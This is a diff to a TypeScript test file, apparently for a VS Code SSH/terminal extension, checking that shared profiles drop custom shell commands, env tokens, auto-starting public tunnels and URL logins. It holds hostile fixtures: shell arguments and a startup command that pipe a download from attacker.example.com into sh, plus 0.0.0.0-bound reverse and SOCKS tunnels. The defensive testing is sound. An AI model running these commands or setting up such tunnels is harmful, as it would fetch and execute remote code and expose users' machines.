@@ -816,7 +816,7 @@ function everyLocalShellField(): LocalShellProfile {
     id: "sh-1",
     name: "Build shell",
     group: "Dev",
-    launchMode: "custom",
+    launchMode: "vscodeProfile",
     vscodeProfileName: "bash",
     shellPath: "/bin/bash",
     shellArgs: ["-l"],
@@ -872,11 +872,11 @@ const SHIPPED_SERVER_KEYS = [
   "openFileExplorerOnFirstConnect", "origin", "port", "protocol", "proxy", "username"
 ];
 const SHIPPED_TUNNEL_KEYS = [
-  "autoStart", "autoStop", "browserUrl", "connectionMode", "defaultServerId", "id", "localBindAddress", "localPort",
+  "autoStart", "autoStop", "browserUrl", "connectionMode", "defaultServerId", "id", "localPort",
   "localTargetIP", "name", "notes", "remoteBindAddress", "remoteIP", "remotePort", "tunnelType"
 ];
 const SHIPPED_SERIAL_KEYS = ["baudRate", "dataBits", "group", "id", "logSession", "mode", "name", "parity", "path", "rtscts", "stopBits"];
-const SHIPPED_LOCAL_SHELL_KEYS = ["group", "id", "launchMode", "name", "shellArgs", "shellPath", "vscodeProfileName"];
+const SHIPPED_LOCAL_SHELL_KEYS = ["group", "id", "launchMode", "name", "vscodeProfileName"];
 const SHIPPED_MACRO_KEYS = [
   "group", "id", "keybinding", "name", "provideIpmiCredentials", "route", "runIn", "secret", "slot", "text", "triggerCooldown",
   "triggerInitiallyDisabled", "triggerInterval", "triggerPattern", "triggerProfileId", "triggerScope", "variables"
@@ -1684,7 +1684,7 @@ describe("share import — synced servers", () => {
     // As the previous release's exporter wrote them: what it clears is already absent or blank.
     const oldServer = makeServer({ id: "old-1", name: "Old Router", username: "user", authType: "key", keyPath: "" });
     const oldSerial = { id: "old-ser", name: "Console", path: "/dev/ttyUSB0", baudRate: 9600, dataBits: 8, stopBits: 1, parity: "none", rtscts: false };
-    const oldShell = { id: "old-ls", name: "Build shell", launchMode: "custom", shellPath: "/bin/bash", shellArgs: ["-l"] };
+    const oldShell = { id: "old-ls", name: "Build shell", launchMode: "vscodeProfile", vscodeProfileName: "bash" };
     const oldShare = JSON.stringify({
       version: 2,
       exportType: "share",
@@ -1775,8 +1775,8 @@ describe("share import — what the export clears, cleared again", () => {
           {
             id: "ls-1",
             name: "Build shell",
-            launchMode: "custom",
-            shellPath: "/bin/bash",
+            launchMode: "vscodeProfile",
+            vscodeProfileName: "bash",
             cwd: "/home/bob/secret-project",
             startupCommand: "curl https://attacker.example.com/x | sh",
             env: { API_TOKEN: "FILE-TOKEN" }
@@ -1786,7 +1786,7 @@ describe("share import — what the export clears, cleared again", () => {
     );
 
     const [profile] = recipient.core.getSnapshot().localShellProfiles;
-    expect(profile).toMatchObject({ name: "Build shell", launchMode: "custom", shellPath: "/bin/bash" });
+    expect(profile).toMatchObject({ name: "Build shell", launchMode: "vscodeProfile", vscodeProfileName: "bash" });
     for (const key of ["cwd", "startupCommand", "env"]) {
       expect(profile).not.toHaveProperty(key);
     }
@@ -2043,7 +2043,7 @@ describe("share round trip — the recipient's first sync adopts the cached tree
     { label: "absent serial profile", bucket: "serialProfiles", id: "missing-serial" },
     { label: "rejected serial profile", bucket: "serialProfiles", id: "rejected-serial", record: (id) => ({ ...everySerialField(), id, path: "" }) },
     { label: "absent Local Shell profile", bucket: "localShellProfiles", id: "missing-shell" },
-    { label: "rejected Local Shell profile", bucket: "localShellProfiles", id: "rejected-shell", record: (id) => ({ ...everyLocalShellField(), id, shellPath: "" }) }
+    { label: "rejected Local Shell profile", bucket: "localShellProfiles", id: "rejected-shell", record: (id) => ({ ...everyLocalShellField(), id, vscodeProfileName: "" }) }
   ];
 
   it.each(unavailableTriggerTargets)("strips every trigger setting for a direct share with an $label target, preserving the macro", async ({ bucket, id, record }) => {
@@ -2385,5 +2385,129 @@ describe("share round trip — the recipient's first sync adopts the cached tree
     expect(getMacros().map((macro) => macro.name)).toContain("Shared macro");
     expect(getMacros().map((macro) => macro.name)).not.toContain("Secret macro");
     expect(lastInfoMessage()).toContain("(2 skipped).");
+  });
+});
+
+describe("a share never hands over a shell command or an unattended tunnel (#254, #255)", () => {
+  const customShell = {
+    id: "x",
+    name: "Team build shell",
+    launchMode: "custom",
+    shellPath: "/bin/sh",
+    shellArgs: ["-c", "curl -fsS https://attacker.example.com/p | sh; exec bash -l"]
+  };
+  const hostileTunnels = [
+    { id: "t1", name: "socks", tunnelType: "dynamic", localPort: 1080, remoteIP: "0.0.0.0", remotePort: 0, localBindAddress: "0.0.0.0", defaultServerId: "s1", autoStart: true, connectionMode: "shared" },
+    { id: "t2", name: "rev", tunnelType: "reverse", localPort: 22, remoteIP: "0.0.0.0", remotePort: 2222, remoteBindAddress: "0.0.0.0", localTargetIP: "10.0.0.5", defaultServerId: "s1", autoStart: true },
+    { id: "t3", name: "web", localPort: 18080, remoteIP: "127.0.0.1", remotePort: 80, defaultServerId: "s1", autoStart: false, browserUrl: "http://admin:secret@localhost:{localPort}/" },
+    { id: "t4", name: "kept", localPort: 18081, remoteIP: "127.0.0.1", remotePort: 81, defaultServerId: "s1", autoStart: false, remoteBindAddress: "127.0.0.1", browserUrl: "http://localhost:{localPort}/a@b" }
+  ];
+
+  it("import: a custom Local Shell profile is not imported, counted, and named with its remedy; a VS Code profile still lands (⊘ shellPath/shellArgs \"keep\", which lands the command line)", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({ localShellProfiles: [customShell, { id: "v", name: "Bash", launchMode: "vscodeProfile", vscodeProfileName: "bash", shellPath: "/bin/sh", shellArgs: ["-c", "x"] }] })
+    );
+
+    const profiles = recipient.core.getSnapshot().localShellProfiles;
+    expect(profiles.map((p) => p.name)).toEqual(["Bash"]);
+    expect(JSON.stringify(profiles)).not.toMatch(/attacker|shellArgs|shellPath/);
+    expect(lastInfoMessage()).toContain("Imported 1 profiles.");
+    expect(lastInfoMessage()).toContain("1 custom Local Shell profile not imported");
+    expect(lastInfoMessage()).toContain("Add Local Shell Profile");
+  });
+
+  it("export: custom Local Shell profiles are left out and counted (⊘ shipping the sender's command line and absolute paths)", () => {
+    const result = sanitizeForSharing([], [], [], [customShell as unknown as LocalShellProfile, everyLocalShellField()]);
+    expect(result.localShellProfiles).toHaveLength(1);
+    expect(result.omittedLocalShellProfiles).toBe(1);
+    expect(JSON.stringify(result)).not.toMatch(/attacker|\/bin\/sh|shellArgs|shellPath/);
+  });
+
+  it("export message names the omitted custom Local Shell profiles", async () => {
+    const sender = await makeMachine();
+    await sender.core.addOrUpdateLocalShellProfile(customShell as unknown as LocalShellProfile);
+    const written = await exportShare(sender);
+    expect(JSON.parse(written).localShellProfiles).toEqual([]);
+    expect(lastInfoMessage()).toContain("1 custom Local Shell profile left out");
+    expect(lastInfoMessage()).toContain("Add Local Shell Profile");
+  });
+
+  it("import: tunnels arrive with auto-start off, no listener address, loopback-only remote bind and no URL login (⊘ every one of them kept)", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        servers: [makeServer({ id: "s1", name: "lab-bastion", username: "user" })],
+        tunnels: hostileTunnels
+      })
+    );
+
+    const tunnels = recipient.core.getSnapshot().tunnels;
+    expect(tunnels).toHaveLength(4);
+    for (const tunnel of tunnels) {
+      expect(tunnel.autoStart).toBe(false);
+      expect(tunnel.localBindAddress).toBeUndefined();
+    }
+    const byName = (name: string) => tunnels.find((t) => t.name === name)!;
+    expect(byName("rev").remoteBindAddress).toBeUndefined();
+    expect(byName("rev").localTargetIP).toBe("10.0.0.5");
+    expect(byName("kept").remoteBindAddress).toBe("127.0.0.1");
+    expect(byName("web").browserUrl).toBe("http://localhost:{localPort}/");
+    expect(byName("kept").browserUrl).toBe("http://localhost:{localPort}/a@b");
+    expect(JSON.stringify(tunnels)).not.toContain("secret@");
+    expect(lastInfoMessage()).toContain("2 tunnels arrived with auto-start off and a loopback-only listener");
+  });
+
+  it("export: none of auto-start, a bind address or a URL login survives (⊘ \"keep\")", () => {
+    const [t] = hostileTunnels;
+    const out = sanitizeForSharing(
+      [],
+      [
+        { ...t, localBindAddress: "192.0.2.10", remoteBindAddress: "192.0.2.11", browserUrl: "http://admin:secret@localhost:{localPort}/" } as unknown as TunnelProfile
+      ],
+      [],
+      []
+    );
+    expect(out.tunnels[0].autoStart).toBe(false);
+    expect(JSON.stringify(out)).not.toMatch(/192\.0\.2|secret@/);
+  });
+});
+
+describe("duplicate ids inside one share (#257)", () => {
+  const dup = (name: string, host: string) => ({ id: "dup", name, host, port: 22, username: "u", authType: "password", isHidden: false });
+
+  it("the first server under an id lands; the second is skipped and counted (⊘ the second overwriting the first and both counted)", async () => {
+    const recipient = await makeMachine();
+    await importShare(recipient, shareJson({ servers: [dup("A", "192.0.2.1"), dup("B", "192.0.2.2")] }));
+
+    const servers = recipient.core.getSnapshot().servers;
+    expect(servers.map((s) => s.name)).toEqual(["A"]);
+    expect(lastInfoMessage()).toBe("Imported 1 profiles (1 skipped).");
+  });
+
+  it("the first auth profile under an id lands and a server linked to that id follows it", async () => {
+    const recipient = await makeMachine();
+    await importShare(
+      recipient,
+      shareJson({
+        authProfiles: [makeProfile({ id: "ap", name: "First", username: "user" }), makeProfile({ id: "ap", name: "Second", username: "user" })],
+        servers: [makeServer({ id: "s", name: "Linked", username: "user", authProfileId: "ap" })]
+      })
+    );
+
+    const snapshot = recipient.core.getSnapshot();
+    expect(snapshot.authProfiles.map((p) => p.name)).toEqual(["First"]);
+    expect(snapshot.servers[0].authProfileId).toBe(snapshot.authProfiles[0].id);
+    expect(lastInfoMessage()).toBe("Imported 2 profiles (1 skipped).");
+  });
+
+  it("two rows with blank ids both import (ensureId gives each its own)", async () => {
+    const recipient = await makeMachine();
+    await importShare(recipient, shareJson({ servers: [{ ...dup("A", "192.0.2.1"), id: "" }, { ...dup("B", "192.0.2.2"), id: "" }] }));
+
+    expect(recipient.core.getSnapshot().servers.map((s) => s.name).sort()).toEqual(["A", "B"]);
+    expect(lastInfoMessage()).toBe("Imported 2 profiles.");
   });
 });
